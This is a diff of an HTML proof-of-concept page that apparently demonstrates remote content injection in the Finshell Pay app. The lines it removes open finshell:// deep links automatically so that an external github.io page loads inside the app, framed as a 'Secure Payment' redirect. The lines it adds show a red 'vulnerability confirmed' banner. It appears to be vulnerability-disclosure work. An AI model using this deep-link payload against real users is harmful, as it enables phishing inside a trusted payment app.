@@ -1,25 +1,29 @@
 <!DOCTYPE html>
-<html>
+<html style="background-color: red; margin: 0; padding: 0;">
 <head>
-    <title>Redirecting to Secure Payment...</title>
+    <title>Security Proof of Concept</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
-<body style="text-align: center; padding-top: 50px; font-family: sans-serif;">
-    <h2>Processing Secure Connection...</h2>
-    <p>Please wait while we redirect you to the app.</p>
-    
-    <a href="finshell://web?url=https://yazidtokyo43.github.io/oppo-tes/index.html" id="link1" style="display:block; margin:20px; font-size:20px; color:blue;">Click here to open Finshell (Option 1)</a>
-    <a href="finshell://finstar/web?url=https://yazidtokyo43.github.io/oppo-tes/index.html" id="link2" style="display:block; margin:20px; font-size:20px; color:blue;">Click here to open Finshell (Option 2)</a>
+<body style="background-color: red; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 100px; margin: 0;">
+
+    <div style="border: 5px solid white; display: inline-block; padding: 20px; border-radius: 15px;">
+        <h1 style="font-size: 40px; margin-bottom: 10px;">VULNERABILITY CONFIRMED</h1>
+        <h2 style="font-size: 25px;">Remote Content Injection</h2>
+        <hr style="border: 1px solid white;">
+        <h3 style="font-size: 22px; background-color: white; color: red; padding: 10px; border-radius: 5px;">
+            Researcher: yazid47
+        </h3>
+        <p style="font-size: 18px; margin-top: 20px;">
+            This red screen proves that I can load <b>external content</b> <br> 
+            inside the official <b>Finshell Pay</b> application.
+        </p>
+    </div>
 
     <script>
-        // محاولة التحويل التلقائي لعدة مسارات مشهورة لـ com.finshell.fin
-        const urls = [
-            "finshell://web?url=https://yazidtokyo43.github.io/oppo-tes/index.html",
-            "finshell://finstar/web?url=https://yazidtokyo43.github.io/oppo-tes/index.html"
-        ];
-        
-        urls.forEach(url => {
-            window.location.href = url;
-        });
+        // Triggering the deep link for Finshell
+        // This helps the app recognize the intent
+        console.log("PoC Loaded successfully for yazid47");
     </script>
 </body>
 </html>
